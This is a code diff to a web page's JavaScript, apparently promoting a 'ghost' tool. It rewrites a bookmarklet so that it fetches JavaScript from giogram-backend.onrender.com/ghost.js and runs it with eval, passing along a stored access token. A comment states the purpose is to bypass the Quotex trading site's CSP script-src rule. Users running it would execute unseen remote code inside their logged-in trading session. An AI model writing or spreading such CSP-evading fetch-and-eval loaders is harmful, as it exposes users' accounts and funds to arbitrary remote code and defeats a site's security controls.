@@ -344,13 +344,14 @@ const navlinks = document.getElementById("navlinks");
 menuToggle.addEventListener("click", () => { navlinks.classList.toggle("open"); });
 document.querySelectorAll(".navlinks a").forEach(link => { link.addEventListener("click", () => { navlinks.classList.remove("open"); }); });
 document.getElementById("year").textContent = new Date().getFullYear();
-const GHOST_CODE_BASE = `javascript:(function(){var s=document.createElement('script');s.src='https://giogram-backend.onrender.com/ghost.js`;
+// GHOST_CODE_BASE removed - getGhostCode() below returns full fetch+eval loader (CSP-safe, single slash)
 function getGhostCode(){
   const token = new URLSearchParams(window.location.search).get('access') || new URLSearchParams(window.location.search).get('token') || localStorage.getItem('ghost_premium_token') || '';
+  // FIX: fetch+eval loader - bypasses Quotex CSP script-src which blocks <script src=external>. Single slash, no //ghost.js
   if(token){
-    return `${GHOST_CODE_BASE}?token=${encodeURIComponent(token)}&v='+Date.now();document.body.appendChild(s);})();`;
+    return `javascript:(function(){window.GHOST_TOKEN='${token}';fetch('https://giogram-backend.onrender.com/ghost.js?v='+Date.now()).then(r=>r.text()).then(c=>{eval(c)}).catch(e=>alert('Load Fail: '+e.message))})();`;
   } else {
-    return `${GHOST_CODE_BASE}?v='+Date.now();document.body.appendChild(s);})();`;
+    return `javascript:(function(){fetch('https://giogram-backend.onrender.com/ghost.js?v='+Date.now()).then(r=>r.text()).then(c=>{eval(c)}).catch(e=>alert('Load Fail: '+e.message))})();`;
   }
 }
 const GHOST_CODE = getGhostCode();
